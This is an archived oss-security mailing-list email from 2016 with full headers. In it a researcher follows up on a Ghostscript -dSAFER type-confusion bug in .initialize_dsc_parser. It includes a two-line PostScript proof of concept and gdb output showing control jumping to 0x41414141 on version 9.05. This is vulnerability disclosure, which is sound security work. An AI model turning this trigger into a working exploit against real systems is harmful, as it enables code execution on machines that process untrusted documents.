X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["965" "Wednesday" "5" "October" "2016" "13:12:19" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkL0F5i-=14bDxN3_PDAvNqQT8PMNGmmij60DLuaHj+meA@mail.gmail.com>" "24" "[oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems" "^Date:" nil nil "10" "2016100520:12:19" "[oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems" (number mark "        taviso@googl Oct  5   24/965   " thread-indent "\"[oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems\"\n") "<CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>" ("<CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19584 invoked by uid 550); 5 Oct 2016 20:12:55 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19566 invoked from network); 5 Oct 2016 20:12:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=ceHzYIW+FK8X8BE7OmFqHMjWvour3//uqDfKupvFgwk=;
        b=aPVmJ6bNNiY54swuvtjKt1lz4AdkvzhjIhNwXmEqIEDta2Oohf1Tv9t/TAhLjVR3h/
         nDuLG1kkhxXG/NtxB/EyMZMigOj1YTeEXDZEhUDnoK95xXrmXwAC8g1ZrkRvgOSxSKpL
         qdE8lGcLwFfmQJFZnVizlevLnyPeu+DFurnn/60G0MtwzxqYKKo2ge37VJk2QZyXnPbV
         K3BJckIcyairOGZBhZVSwwDcbfR7794dY6i9DyGyohbw2WSw92x/+dnq6YCujMYlxDJ7
         ZI15ZrFCVDUC4ozlXcW/9S+silDFY8ZTZSzg5gHIRnVSEjWAX+i7Wl1rjYcAsVnoew6M
         E9nA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=ceHzYIW+FK8X8BE7OmFqHMjWvour3//uqDfKupvFgwk=;
        b=KhWRTQaT5h3HHcvg9Lry0l9DfBXWZrdERImFVc3n61UrwLlmnBDmOI0iaKvF/v1ADO
         wnqQZYDPUv8Lmrit7HVc29/L1TNuEmdfBHIbAvFDSyxaajnF75pMbehMDPSJvbZLaj7N
         0yFvUvtJKaFHlNgjqoQr7+wijA45zPLu9xIzUPYaLPSWJ5avywQAmGuNWNNGr/GWcV50
         3lswYtM9uIpSoLFVGPdmlF472WcvbNkk6y4VlYQm53QlLVtdrGqA1D5aR7MfCjDQGXlb
         cAy4v5CkkXSiywCUjssHM2BNVKmQ1h2I7VmhDqBWC7CfzFhvYWsu6oTSkM/vourTqR8I
         D14g==
X-Gm-Message-State: AA6/9RlcyLeQbweKS907WlqBqF5QA44Sy7Q41e4AU90fjAoW4mWAcpetARbWUUevA7YZfSRT6ZwuMCm3T58iVBjp
X-Received: by 10.176.1.207 with SMTP id 73mr7005418ual.41.1475698360803; Wed,
 05 Oct 2016 13:12:40 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>
References: <CAJ_zFk+f8Q-4UQt0gv6X_v_gSb12UVVVQ1knJBdZjpA=MQ-S5w@mail.gmail.com>
Message-ID: <CAJ_zFkL0F5i-=14bDxN3_PDAvNqQT8PMNGmmij60DLuaHj+meA@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Wed, 5 Oct 2016 13:12:19 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: CVE Request - multiple ghostscript -dSAFER sandbox problems
To: oss-security@lists.openwall.com

On Wed, Oct 5, 2016 at 9:13 AM, Tavis Ormandy <taviso@google.com> wrote:
> bug: type confusion in .initialize_dsc_parser allows remote code execution
> id: http://bugs.ghostscript.com/show_bug.cgi?id=697190
> repro: http://bugs.ghostscript.com/show_bug.cgi?id=697190#c0
> patch: http://git.ghostscript.com/?p=ghostpdl.git;h=875a0095f37626a721c7ff57d606a0f95af03913

It was pointed out to me that my testcase doesn't work on the 9.0x
versions, because it doesn't allow encoding 64-bit integers, but it's
still exploitable.

For example, something like this should jump to 0x41414141:

$ cat test.ps
%!PS
[16#1 16#2 16#3 16#41414141 [16#4]] .initialize_dsc_parser
$ gdb -q -ex r --args gs -dSAFER -f test.ps
GPL Ghostscript 9.05 (2012-02-08)
Copyright (C) 2010 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.

Program received signal SIGSEGV, Segmentation fault.
0x0000000041414141 in ?? ()

Tavis.
